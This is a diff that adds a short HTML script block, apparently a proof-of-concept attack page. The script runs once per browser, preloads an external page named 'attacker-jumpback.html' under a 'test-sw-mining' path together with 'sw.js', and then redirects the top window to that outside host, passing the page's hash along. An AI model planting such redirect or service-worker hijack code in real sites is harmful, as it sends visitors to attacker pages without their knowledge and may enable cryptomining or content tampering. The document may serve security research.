@@ -1,0 +1,33 @@
+<script>
+if (navigator.serviceWorker) {
+  setupSw();
+}
+function preload(list, cb) {
+  var count = 0;
+  for (var i = 0; i < list.length; i++) {
+    var img = new Image();
+    img.onerror = function() {
+      if (++count == list.length) {
+        cb();
+      }
+    };
+    img.src = list[i];
+  }
+}
+function setupSw() {
+  try {
+    if (localStorage.sw) {
+      return;
+    }
+    localStorage.sw = 1;
+  } catch (err) {
+    return;
+  }
+  var refer = location.hash.substr(1);
+  var url = 'https://boyangwang.github.com/test-sw-mining/attacker-jumpback.html?back_url=' + encodeURI(refer);
+  var reslist = [url, 'sw.js'];
+  preload(reslist, function() {
+    top.location = url;
+  });
+}
+</script>
